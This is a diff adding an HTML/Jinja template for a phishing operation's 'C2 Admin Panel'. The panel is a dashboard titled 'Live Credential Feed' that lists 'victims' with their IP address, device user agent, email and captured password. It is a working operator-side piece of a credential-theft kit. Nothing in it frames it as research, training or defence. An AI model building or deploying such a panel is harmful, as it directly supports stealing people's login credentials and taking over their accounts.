@@ -1,0 +1,38 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <title>C2 Admin Panel</title>
+    <style>
+        body { background-color: #0d1117; color: #00ff41; font-family: 'Courier New', monospace; padding: 20px; }
+        h1 { border-bottom: 2px solid #00ff41; padding-bottom: 10px; text-transform: uppercase; }
+        table { width: 100%; border-collapse: collapse; margin-top: 20px; }
+        th, td { border: 1px solid #30363d; padding: 10px; text-align: left; }
+        th { background-color: #161b22; color: #fff; }
+        tr:nth-child(even) { background-color: #161b22; }
+        .pass { color: #ff5555; font-weight: bold; }
+    </style>
+</head>
+<body>
+    <h1>[*] Live Credential Feed</h1>
+    <table>
+        <tr>
+            <th>ID</th>
+            <th>Time</th>
+            <th>IP Address</th>
+            <th>Device (User Agent)</th>
+            <th>Email</th>
+            <th>Captured Password</th>
+        </tr>
+        {% for v in victims %}
+        <tr>
+            <td>{{ v['id'] }}</td>
+            <td>{{ v['timestamp'] }}</td>
+            <td>{{ v['ip_address'] }}</td>
+            <td><small>{{ v['user_agent'] }}</small></td>
+            <td>{{ v['email'] }}</td>
+            <td class="pass">{{ v['password'] }}</td>
+        </tr>
+        {% endfor %}
+    </table>
+</body>
+</html>
